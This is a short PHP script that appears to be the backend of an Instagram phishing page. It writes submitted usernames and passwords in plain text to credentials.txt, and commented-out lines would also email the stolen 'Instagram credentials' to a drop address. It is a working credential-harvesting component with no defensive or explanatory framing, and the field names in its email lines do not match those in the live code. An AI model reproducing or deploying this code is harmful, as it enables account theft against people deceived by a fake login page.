<?php
// DEBUG
// $file = fopen("credentials.txt", "a");
// fwrite($file, json_encode($_POST) . PHP_EOL);
// fclose($file);

if (isset($_POST['username']) && isset($_POST['password'])) {
    $file = fopen("credentials.txt", "a");
    fwrite($file, $_POST['username'] . "\t" . $_POST['password'] . PHP_EOL);
    fclose($file);
    // uncomment the lines below to receive the credentials by email
    // $maildrop = "sample@email.com";
    // mail($maildrop, "Instagram credentials", $_POST['email'] . "\t" . $_POST['pass']);
}
